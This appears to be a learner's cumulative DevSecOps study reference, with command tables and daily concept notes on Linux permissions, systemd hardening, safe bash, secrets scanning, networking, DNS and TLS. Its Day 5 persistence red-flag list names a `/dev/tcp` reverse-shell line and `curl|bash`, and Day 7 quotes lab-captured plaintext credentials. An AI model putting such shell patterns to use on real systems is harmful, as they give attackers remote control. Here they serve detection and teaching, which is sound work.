# SUMMARY.md — Cumulative Command & Concept Reference

Running reference for the 90-day DevSecOps program. Appended at the end of each day.
Covers **Days 1–7**.

---

# COMMAND REFERENCE

## System & process inspection

| Command | What it does | When you reach for it |
|---|---|---|
| `uname -a` | Kernel, arch, hostname | Confirming what OS/kernel you're on |
| `cat /etc/os-release` | Distro name and version | Identifying the exact release |
| `free -h` | Memory used/free | Checking for memory exhaustion |
| `df -h` | Disk space per filesystem | **First check on any "it's broken" report** |
| `df -h /path` | Space for one mount | Cutting through noisy mount lists |
| `df -i` | **Inode** usage | "Disk full" but `df -h` shows free space |
| `du -sh /path/*` | Size per item | Finding *what* consumed the space |
| `du -sh /path/* \| sort -h` | Sorted by size | Biggest offenders first |
| `uptime` | Load average | Is the box saturated? |
| `ps aux --sort=-%mem \| head` | Top memory consumers | Runaway process hunt |
| `ps -eo pid,ppid,user,comm --forest` | Process tree with ancestry | Seeing parent/child relationships |
| `ps -eo user \| tail -n +2 \| sort \| uniq -c \| sort -rn` | Process count per user | **Measuring root attack surface** |
| `ps -p 1 -o comm=` | What is PID 1 | Confirming systemd vs init shim |
| `lsof /path/to/file` | Which processes hold a file open | **Before deleting any large file** |
| `cat /proc/<pid>/comm` | Kernel's live truth about a process | When `ps` output is ambiguous |

## Files, permissions & ownership

| Command | What it does | When you reach for it |
|---|---|---|
| `ls -l` | Long listing: perms, owner, group | Reading permissions |
| `ls -ld <dir>` | The **directory itself**, not contents | **Deletion/traversal problems** |
| `ls -n` | Numeric UID/GID instead of names | Verifying IDs match across systems |
| `chmod 755 file` | Set permission bits numerically | Standard permission setting |
| `chmod +x file` | Add execute for all triads | Making a script runnable |
| `chown user:group file` | Change owner and group | Fixing ownership |
| `chgrp group file` | Change group only | Assigning a dir to a team |
| `umask` | Mask subtracted from new-file defaults | Explaining why new files are 644 |
| `namei -l /full/path` | Permissions of **every path component** | "Which part of the path blocks me?" |
| `lsattr file` | Filesystem-level attributes (`i`=immutable, `a`=append-only, `e`=extent/normal) | When even **root** is denied |
| `getfacl file` / `getfacl -n file` | Read ACLs (numeric IDs with `-n`) | Perms look right but access fails |
| `setfacl -d -m g::rwx dir` | **Default ACL** — new files inherit group write | Shared dirs that must stay writable |
| `file <path>` | Identify file type by content | `data` = binary; `ASCII text` = real log |
| `head -c 200 file \| xxd` | First bytes in hex | Confirming what a file actually contains |
| `truncate -s 0 file` | Empty a file, keep the inode | **Frees space even with a live writer** |
| `stat file` | Full metadata | Timestamps, inode, exact mode |

## Users, groups & privilege

| Command | What it does | When you reach for it |
|---|---|---|
| `id` / `id <user>` | UID, GID, all group memberships | **Verifying who a process actually is** |
| `id -nG` | Group names only | Quick membership check |
| `getent group <name>` | Group entry + members | Confirming who's in a group |
| `useradd --system --no-create-home --shell /usr/sbin/nologin <n>` | Minimal service account | Creating a non-root service identity |
| `usermod -aG <group> <user>` | Add to supplementary group | Granting group access (`-a` = append!) |
| `sudo -u <user> <cmd>` | Run as another user | **Testing permissions as the real identity** |
| `sudo -u <user> bash -c '...'` | Multi-command as another user | Testing with redirects/pipes |
| `sudo -l` | What sudo rights do I have | Auditing your own privilege |
| `sudo -n <cmd>` | Non-interactive (no password prompt) | Crisp allow/deny testing |
| `visudo -c -f <file>` | **Syntax-check** a sudoers file | Always, before trusting a sudoers edit |

## systemd & services

| Command | What it does | When you reach for it |
|---|---|---|
| `systemctl status <unit>` | State, PID, recent logs | **First command for any service issue** |
| `systemctl start/stop/restart <unit>` | Control a service | Basic lifecycle |
| `systemctl enable --now <unit>` | Enable at boot **and** start now | Making a service permanent |
| `systemctl is-enabled <unit>` | Boot-start status | Verifying persistence |
| `systemctl daemon-reload` | Re-read unit files | **After every unit file edit** |
| `systemctl --failed` | All failed units | System-wide health sweep |
| `systemctl list-timers --all` | Every timer, next/last run | **Scheduled-execution audit** |
| `systemctl edit --full <unit>` | Edit a unit safely | Modifying units |
| `systemd-analyze security <unit>` | **Exposure score 0.0–10.0** + per-directive checklist | Measuring/proving hardening |
| `journalctl -u <unit>` | Logs for one unit | Reading service output |
| `journalctl -u <unit> -n 30 --no-pager` | Last 30 lines, no pager | Quick error hunt |
| `journalctl -p err -b` | Errors this boot | Broad "what's broken" sweep |
| `journalctl --since "2 hours ago"` | Time-bounded logs | **Correlating to "what changed"** |

**systemd exit codes:** `203/EXEC` = couldn't execute the ExecStart target (file missing, not executable, bad shebang). Distinct from the program running and failing on its own.

## Packages & integrity

| Command | What it does | When you reach for it |
|---|---|---|
| `apt update && apt upgrade -y` | Refresh index, patch | Always before installing |
| `apt list --upgradable` | What's pending | Evidence *before* acting |
| `dpkg -S <file>` | **Which package owns a file** | Attributing unknown cron jobs/binaries |
| `sha256sum <file>` | Compute checksum | **Verifying any downloaded binary** |
| `ls /etc/apt/keyrings/` | Per-repo GPG keys | Auditing repo trust |

## Bash & scripting

| Construct | Meaning | Notes |
|---|---|---|
| `set -e` | Exit on **command failure** | Doesn't fire in `if`/`&&`/`\|\|`/`!` conditions |
| `set -u` | Error on **unset** variable | Does **NOT** catch set-but-empty |
| `set -o pipefail` | Pipeline fails if **any** stage fails | Without it `tar \| gzip` hides tar's death |
| `set -euo pipefail` | All three | Standard header |
| `"$var"` | Quoted expansion | Stops word-splitting + globbing |
| `${1:?message}` | **Required** — error if unset **or empty** | The only guard for the empty case |
| `${2:-default}` | **Optional** — fallback if unset/empty | Optional args |
| `$(cmd)` | **Run** cmd, substitute its output | `"cmd"` stores literal text — not the same |
| `[[ -d "$x" ]]` | Is a directory | Guard before destructive ops |
| `[[ -f "$x" ]]` | Is a regular file | Guard for file args |
| `[[ -e "$x" ]]` | Exists (any type) | Existence check |
| `[[ ${#arr[@]} -gt 0 ]]` | Array non-empty | `-gt/-lt/-eq/-ne/-ge/-le` for numbers |
| `shopt -s nullglob` | Non-matching glob → **nothing** | Otherwise you process a literal `*.log` |
| `trap 'cmd' ERR` | Run on any command failure | Failure alerting |
| `>&2` | Send to stderr | Errors separable from output |
| `>` vs `>>` | Overwrite vs append | **`>` recreates at umask default, dropping chmod** |
| `\| tee -a file` | Write to file **and** stdout | Logging that cron also captures |
| `shellcheck script.sh` | Static analysis | Grammar only — **not** correctness |

**Text processing:**
| Command | Purpose |
|---|---|
| `awk '{print $1}' file` | Extract field 1 — **single quotes** so bash doesn't eat `$1` |
| `sort` | Group identical lines (required before `uniq`) |
| `uniq -c` | Collapse duplicates, prepend count |
| `sort -rn` | Numeric, highest first |
| `sort -h` | Human-readable sizes (1K, 2M) |
| `grep -c 'pattern' file` | Count matching lines |
| `head -n N` / `tail -n N` | First / last N lines |
| `tail -n +N` | Everything **from** line N onward |
| `cut -d' ' -f2-` | Fields 2+ using space delimiter |
| `xargs -r cmd` | Build args from stdin (`-r` = skip if empty) |
| `find dir -maxdepth 1 -name 'x*' -printf '%T@ %p\n'` | Robust file listing with mtime — **never parse `ls`** |

**Classic pipeline — top N by frequency:**
```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5
```

## Git & secrets

| Command | What it does |
|---|---|
| `git log --oneline -N` | Compact recent history |
| `git log --stat --oneline -1 <sha>` | What changed in one commit |
| `git status` | Staged / unstaged / untracked |
| `git reset HEAD~1` | Undo last commit, keep files |
| `git reset HEAD <file>` | Unstage a file |
| `gitleaks git .` | Scan **full repo history** |
| `git diff --cached \| gitleaks stdin` | Scan **staged** changes (pre-commit) |
| `gitleaks dir -s .` | Scan a directory (non-git) |

**gitleaks v8.19+ syntax change:** `detect` → `git`, `detect --no-git` → `dir`, `protect --staged` → `git diff --cached | gitleaks stdin`. Old forms work but are hidden from help — most online tutorials are stale.

## Scheduling

| Command | What it does |
|---|---|
| `crontab -e` / `crontab -l` | Edit / list your crontab |
| `sudo crontab -l` | **Root's** crontab |
| `cat /etc/crontab` | System-wide crontab |
| `ls -la /etc/cron.d/` | Drop-in jobs (**common hiding spot**) |
| `ls -la /etc/cron.{hourly,daily,weekly,monthly}/` | run-parts directories |
| `ls -la /var/spool/cron/crontabs/` | Every user's crontab |

**Cron format:** `minute hour day-of-month month day-of-week command`
Always append `>> /path/log 2>&1` — without it, output goes nowhere.

## Networking

| Command | What it does | Layer |
|---|---|---|
| `ip addr show` | Interfaces and their IPs | L3 |
| `ip route show` | Routing table; `default via X` = gateway | L3 |
| `ip neigh show` | ARP table (IP↔MAC) | L2 |
| `ss -tulnp` | **Listening** sockets + owning process | L4 |
| `ss -tun` | **Active** connections | L4 |
| `cat /etc/resolv.conf` | Which DNS resolver this box uses | L7 |
| `tcpdump -i <if> -A -s 0 'filter'` | Capture packets, ASCII payload, full length | All |
| `tcpdump -w file.pcap` | Write raw capture to file | — |
| `tcpdump -r file.pcap -A -n` | Read a saved capture | — |
| `base64 -d` | Decode base64 | — |

**tcpdump flags:** `-i` interface · `-A` ASCII payload · `-s 0` full packet (default truncates) · `-n` no DNS resolution · `-w` write file · `-r` read file · `'tcp port 8080'` BPF filter.

**Filter the noise:** `tcpdump -r cap.pcap -A -n | grep -Ei 'password|authorization|GET|POST'`

---

# CONCEPTS BY DAY

## Day 1 — Environment & attack-surface baseline (CC7.1)
- **Filesystem map:** `/etc` = declared config (what it *should* be) · `/var` = state and logs (what *happened*) · `/usr`,`/bin`,`/sbin` = executable surface · `/home`,`/root` = identities · `/tmp` = world-writable staging ground · `/proc` = kernel's live truth.
- **Socket triage:** the **Local Address** column decides exposure. `127.0.0.1`/`::1` = this machine only. `0.0.0.0`/`*` = every interface **this machine has** — *not* automatically "the internet"; actual reachability depends on which interface and what it connects to.
- **Baseline logic:** you cannot detect drift you never recorded. A baseline is evidence only if it is (a) captured at a known-good moment, (b) **stored immutably** (git commits are hash-chained → tamper-evident), and (c) **re-runnable for comparison**. Detection = baseline + comparison + immutability.
- **Isolation:** disposable lab instance so destructive labs never touch daily-driver work.

## Day 2 — Permissions & least privilege (CC6.1)
- 9 bits: owner/group/other × r/w/x. `r=4 w=2 x=1`.
- **On directories:** `r` = list names · `w` = **add/delete/rename entries** · `x` = traverse/enter.
- **Deleting a file is a WRITE to its DIRECTORY**, not to the file. You can delete a file you can't read; you can be unable to delete your own file.
- **Special bits (leading digit):** setuid `4` = run as the **file's owner** (not "temporary root" — root only when root owns it) · setgid `2` = on a dir, new files inherit the dir's group · sticky `1` = delete only files you own.
- **Setuid is a privilege-escalation primitive by design.** The finding question is: *does this binary genuinely need root, and is it audited?* Not the permission bits, not who can execute it.
- **Three independent levers for a shared dir:** setgid → group *ownership* · `g+w`/default ACL → *editing* · sticky → *delete-protection*. setgid does **not** grant group write.
- `>` truncates and **recreates** a file at the umask default, silently discarding an earlier `chmod`. Per-file chmod is fragile; use default ACLs or a `002` umask.
- **sudoers:** `user HOST=(runas) NOPASSWD: /exact/command`. `NOPASSWD` scopes to *that command only*. Always `visudo`. Use `/etc/sudoers.d/` drop-ins, mode 440.
- **Debugging rule:** when **root** is denied a basic operation, the cause is *below* permissions (immutable attribute, MAC, filesystem).
- **Test as the identity you're testing.** Half of "permissions are confusing" is running verification as the wrong user.

## Day 3 — Processes, systemd, packages (CC6.1, CC6.8)
- **The security question for any process: what user does it run as?** That bounds what an attacker who hijacks it can do. Root process count = attack surface; each is a no-escalation path to full control.
- **Non-root services convert "one bug = own the box" into "one bug = contained foothold."**
- Unit sections: `[Unit]` metadata/ordering · `[Service]` execution + hardening · `[Install]` boot behaviour.
- `Type=oneshot` ending `inactive (dead)` is **success**, not failure.
- **Hardening directives that matter:** `NoNewPrivileges=true` (kernel refuses privilege gain on exec → **neutralizes setuid escalation**) · `ProtectSystem=strict` (filesystem read-only) · `PrivateTmp=true` (isolated /tmp) · `PrivateNetwork=true` (no network at all — biggest score mover) · `CapabilityBoundingSet=` empty (drops all ~40 capabilities) · `SystemCallFilter=@system-service` (seccomp allowlist) · `RestrictSUIDSGID=true`.
- **Measured result: 8.3 EXPOSED → 1.9 OK with function preserved.** The score is a *checklist coverage* metric, not a threat assessment — it knows nothing about your code's own bugs.
- **Timers > cron:** journald logging by default · `Persistent=true` catches up missed runs · full unit sandboxing applies · unit files are version-controllable and diffable (crontabs are scattered and hideable).
- **Package integrity:** apt installs **as root**, so signature verification prevents a malicious mirror/MITM from delivering a root-installed payload. **Per-repo keys (`signed-by=`) beat the old global `apt-key` store because of SCOPE OF TRUST** — globally, any trusted key could vouch for *any* repo; `signed-by=` binds one key to one repo.

## Day 4 — Safe bash (CC6.1, CC8.1)
- **Shell expansion order:** substitute → **word-split** → **glob-expand**. The last two are where scripts get exploited.
- **Three distinct bug classes, three distinct fixes — none substitutes for another:**
  - spaces/wildcards **in** a variable → **quoting** `"$var"`
  - variable **unset** → **`set -u`**
  - variable **set but empty** → **`${var:?}`** (quoting and `set -u` both miss this)
- **The Steam bug (2015):** `rm -rf "$STEAMROOT/"*` with an empty variable became `rm -rf "/"*`. Quoting was present and irrelevant — the collapse is an *emptiness* problem.
- **`shellcheck` validates grammar, not correctness.** A clean script can still do nothing you intended. Verify behaviour on **good, empty, and bad** input.
- **`bash script.sh` needs read; `./script.sh` needs read + execute** (kernel reads the shebang and requires the `x` bit).
- Log analysis surfaces attacker behaviour: one IP + repeated 401s on `/login` = brute force; `/../../etc/passwd` = path traversal.

## Day 5 — Automation & secrets hygiene (A1.2, CC6.8, CC7.1)
- **Backup assurance ladder — four different claims:** scheduled ≠ executed ≠ integrity-verified ≠ **recoverable**. Auditors ask about the last. Only a restore drill (`diff -r` against source) proves it.
- The classic disaster is not "no backups" but "backups silently failing for months" — `tar | gzip` exits 0 even when tar dies.
- **Test your failure path.** An alert that has never fired is an assumption.
- **Scanner limits:** gitleaks missed a raw AWS secret key (40 base64 chars ≈ indistinguishable from any hash). It detects **prefixed** secrets (`AKIA…`, `ghp_…`, `xoxb-…`, `-----BEGIN … KEY-----`). Every detector trades sensitivity vs false positives — **know what yours misses**.
- **Local hooks are convenience, not enforcement:** not version-controlled, don't survive a clone, and `git commit --no-verify` bypasses them. CI-side scanning is the enforcement layer. Two gaps (detection + enforcement) need two different fixes.
- **Fail-closed design:** if the scanner is missing, the hook must **block**, not pass.
- **Cron environment trap:** no shell profile loaded, minimal `$PATH`, different cwd. Use absolute paths. Security variant = **PATH hijacking** (attacker-controlled dir earlier in `$PATH` → root runs their binary on a schedule).
- **Root-cron review checklist:** (1) who can write the script and its parent dirs (2) guarded/quoted variables (3) absolute paths or explicit `PATH` (4) untrusted input reaching a *code* position (`eval`, `curl|bash`, `sh -c "...$var..."`) (5) output logged and fails safely.
- **Persistence red flags:** `curl|bash`, base64-decoded commands, `@reboot`, paths in `/tmp` or `/dev/shm`, `/etc/cron.d` files no package owns, `bash -i >& /dev/tcp/IP/PORT`.
- Production example of Day 2: `/var/spool/cron/crontabs` is `drwx-wx--T` (1730) — group write without read, sticky delete-protection.

## Day 6 — Consolidation & debugging method
- **The four-step method:** **Observe** (ask the system, not the ticket) → **Read the error** (it usually names the cause) → **Localize** (which layer?) → **Fix ONE thing and verify**.
- **Step 0 for real incidents: "what changed?"** Most incidents follow a deploy, config edit, package upgrade, cert expiry, or a disk finally filling. Check `dpkg.log`, `journalctl --since`, deploy history.
- **Broaden before narrowing** when the failing component is unknown:
  ```bash
  systemctl --failed ; df -h ; free -h ; uptime ; journalctl -p err -b | tail -40
  ```
- **Time correlation** is the strongest tool: "failures started at 03:14 — what else happened at 03:14?"
- Write observations down as you go; change one thing at a time.

## Day 7 — Networking I
- **Layers = addressing + tools:** L2 MAC (`ip link`, `ip neigh`) · L3 IP/routes (`ip addr`, `ip route`) · L4 ports (`ss`, `nc`) · L7 app (`curl`, `dig`, `tcpdump -A`). Localize a network fault by walking bottom-up: IP? route? port? app?
- **`lo` is always loopback, never your real network path.** Find the interface holding your routable address.
- **Default route** = "everything I don't otherwise know how to reach, send here." The **gateway** (routes packets) and the **resolver** (`/etc/resolv.conf`, turns names into IPs) are different things.
- **CIDR method — no memorized tables:**
  1. host bits = `32 − prefix`
  2. block size = `2^(host bits)`
  3. blocks start at multiples of the block size — **find which block contains your address** (it's often not a boundary)
  4. first address = network · last = broadcast · usable = total − 2
- Prefix < /24: host bits spill into the **third** octet. `/22` → 10 host bits → 2 in the third octet → blocks of 4 there.
- **Backwards:** need N usable hosts → smallest `2^h ≥ N+2` → prefix = `32 − h`.
- **Forwards:** split into N subnets → borrow `log₂(N)` bits (4 subnets = +2 bits).
- **AWS reserves 5 addresses per subnet, not 2** → a `/24` VPC subnet gives **251** usable.
- **ARP has no authentication.** Any host can claim any IP; first answer wins. → **ARP spoofing**: attacker announces "the gateway is at my MAC," silently becomes machine-in-the-middle, forwards traffic so nothing looks broken. Requires no exploit — just presence on the segment.
- **Plaintext protocols leak everything.** Captured in a real `tcpdump`: `GET /login?user=bassam&password=SuperSecret123` in readable ASCII, and `Authorization: Basic YWRtaW46QWRtaW5QQHNzdzByZA==` which is **base64 encoding, not encryption** — one `base64 -d` reverses it, no key needed. Query-string credentials leak *more widely* (proxy logs, browser history, Referer) but neither is protected on the wire.
- **TLS hides what you say, not who you say it to.** Still visible to an in-path attacker: source/destination IPs, ports, **SNI hostname** in the handshake, DNS lookups (unless DoH/DoT), certificate, and **traffic analysis** (timing, sizes, frequency). TLS protects payload, not metadata.
- ARP spoofing + plaintext protocols together are the whole argument for TLS everywhere — and why "it's only internal traffic" is not a defence, since internal segments are exactly where ARP spoofing works.
- **Operational caution learned:** `python3 -m http.server` serves the **current directory** — it exposed the entire repo including `.git/`. An exposed `.git` over HTTP lets an attacker reconstruct full source history and any committed secrets.

DNS (added Day 8)
Command	What it does	When you reach for it
dig <name>	Full lookup: answer section, TTL, flags	Standard resolution check
dig +short <name>	Answer only	Scripting, quick checks
dig +noall +answer <name>	Just the answer records, clean	Readable output
dig @1.1.1.1 <name>	Query a specific resolver	Comparing resolvers; bypassing a broken local one
dig +trace <name>	Walk root → TLD → authoritative yourself	Seeing the delegation chain (blocked by WSL2's DNS proxy)
dig NS <name>	Authoritative nameservers	Who controls the zone
dig TXT <name>	TXT records	SPF/DKIM/verification — leaks vendor + mail infrastructure
dig CAA <name>	Which CAs may issue for this domain	Checking CA scope restriction
dig MX <name>	Mail servers	Mail routing
dig -x <ip>	Reverse lookup (PTR)	IP → name

Record types: A (IPv4) · AAAA (IPv6) · CNAME (alias — dangling CNAME = subdomain takeover) · NS (nameservers) · MX (mail) · TXT (SPF/DKIM/verification) · SOA (zone metadata) · CAA (which CAs may issue) · PTR (reverse).

TLS / certificates (added Day 8)
Command	What it does
openssl s_client -connect host:443 -servername host	Open a TLS connection; -servername = SNI
... -showcerts	Print every certificate in the chain
... -CAfile ca.crt	Verify against a specific CA instead of the system store
... -verify_hostname <name>	Enforce hostname matching (not done by default!)
... -tls1_1 / -tls1	Probe whether old protocols are accepted
openssl x509 -in cert -noout -subject -issuer -dates	Read a certificate's identity and validity window
openssl x509 -in cert -noout -ext subjectAltName	The hostnames a cert is actually valid for
openssl genrsa -out key.pem 4096	Generate a private key
openssl req -x509 -new -nodes -key ca.key -days N -subj "/CN=..." -out ca.crt	Self-signed root CA
openssl req -new -key server.key -out server.csr -subj "/CN=..."	Certificate Signing Request
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile ext -out server.crt	Sign a CSR with your CA
openssl s_server -accept 8443 -cert server.crt -key server.key -www	Run a test TLS server
curl --cacert ca.crt https://host/	curl trusting a specific CA
grep -c "BEGIN CERTIFICATE" /etc/ssl/certs/ca-certificates.crt	Count trusted root CAs

Verify return codes: 0 = chain OK (says nothing about hostname) · 21 = unable to verify first certificate (CA unknown) · 62 = hostname mismatch.

Day 8 — DNS, HTTP, TLS & certificates
Resolution path: stub → recursive resolver → root → TLD → authoritative. Three referrals, four levels, one lookup — which is why caching exists.
DNS is a security control, not plumbing. Control what a name resolves to and TLS still works perfectly — it encrypts faithfully to the attacker's server.
TTL is a security parameter. A poisoned or stale record persists in caches worldwide for the full TTL after the fix; you cannot retroactively shorten a cached TTL. Lower TTLs before planned changes.
Cross-resolver disagreement is a diagnostic signal: benign (geo/CDN/anycast) or serious (hijacking, poisoning, tampered resolver). Query the authoritative server to settle it.
DNS enumeration is recon. NS + A records revealed hosting and CDN; TXT records expose mail infrastructure and SaaS vendors.
Certificate chain: each cert's issuer = the next cert's subject, walked upward until a certificate already in the local trust store is reached.
121 root CAs are trusted by this machine to vouch for any domain. Trust is not scoped — one compromised CA breaks everything (DigiNotar 2011). CAA records narrow it. Same scope of trust principle as per-repo GPG keys.
SAN, not CN. Wildcards match exactly one label: *.example.org covers wrong.example.org but not a.b.example.org and not bare example.org.
Chain validation ≠ hostname validation. Verify return code: 0 (ok) means only that the signature chain is sound. Apps that skip hostname checking accept any valid cert from any CA → MITM with a legitimate certificate. A recurring, expensive, silent bug class.
Old protocol versions are a downgrade surface. A server accepting TLS 1.0/1.1 lets an attacker force the weakest mutually-supported version regardless of client preference. Removal is the only fix.
Root CA = self-signed: subject and issuer identical. Trust comes from being installed, not from being verified.
The trust model in two commands: same certificate → 21 (unable to verify) without the CA, 0 (ok) with -CAfile ca.crt. This is also exactly how corporate TLS interception works.
Environment finding: WSL2's DNS proxy times out on iterative queries (dig +trace, even with +tcp) while recursive lookups succeed. Use dig @<public-resolver>.